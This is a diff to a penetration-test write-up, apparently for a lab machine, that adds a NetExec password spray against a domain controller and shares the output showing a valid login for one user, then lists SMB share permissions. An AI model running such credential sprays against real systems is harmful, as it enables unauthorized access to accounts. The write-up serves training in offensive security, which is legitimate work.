@@ -173,11 +173,40 @@ An email from `alucas@phantom.vl`, who we can note was also listed in our user e
 Viewing the PDF attached gives us a critical finding `Password: Ph4nt0m@5t4rt!` for a potential password spray against our user list.
 ![welcome_template](Outputs/Screenshots/onboarding_pdf.png) 
 
-### Exploitation Steps
+### Active Exploitation
+  **Password Spray** 
+  
+  Using the onboarding password, we'll spray across our users found in the RID bruteforce, find the full output here: [spray.txt](Outputs/nxc/spray.txt)
 
-1.  **Enumerate Public Share**: Access the `Public` share identified during reconnaissance and look for any sensitive files or documents.
-2.  **Investigate `svc_sspr`**: Focus on the `svc_sspr` account
-3.  **Identify Misconfiguration**: Leverage any found credentials or misconfigurations to gain initial access.
+*   **Command**: `nxc smb 10.129.234.63 -u ridusers -p 'Ph4nt0m@5t4rt!' --continue-on-success --log ./Outputs/nxc/spray.txt`
+```
+<SNIP>
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ppayne:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
+SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
+SMB         10.129.234.63   445    DC               [-] phantom.vl\ssteward:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
+</SNIP>
+```
+A positive hit for `ibryant`, we now have active credentials to iterate over our enumeration process again.
+
+### Further Enumeration
+  **Exploring Shares**
+
+  Taking another look at shares, we can see `ibryant` has `READ` access to the `Departments Share`
+*   **Command**: `nxc smb 10.129.234.63 -u ibryant -p 'Ph4nt0m@5t4rt!' --users --log ibryant_shares.txt'`
+```
+SMB         10.129.234.63   445    DC               [*] Enumerated shares
+SMB         10.129.234.63   445    DC               Share           Permissions     Remark
+SMB         10.129.234.63   445    DC               -----           -----------     ------
+SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
+SMB         10.129.234.63   445    DC               C$                              Default share
+SMB         10.129.234.63   445    DC               Departments Share READ
+SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
+SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share
+SMB         10.129.234.63   445    DC               Public          READ
+SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share
+```
+
+
 
 ### Privilege Escalation
 
@@ -187,9 +216,8 @@ Viewing the PDF attached gives us a critical finding `Password: Ph4nt0m@5t4rt!` 
 
 ### Post-Exploitation
 
-*   **Persistence**: Establish persistent access within the network.
-*   **Data Exfiltration**: Identify and exfiltrate sensitive data.
-*   **Cleanup**: Remove traces of intrusion.
+
+
 
 ### Tools Used
 
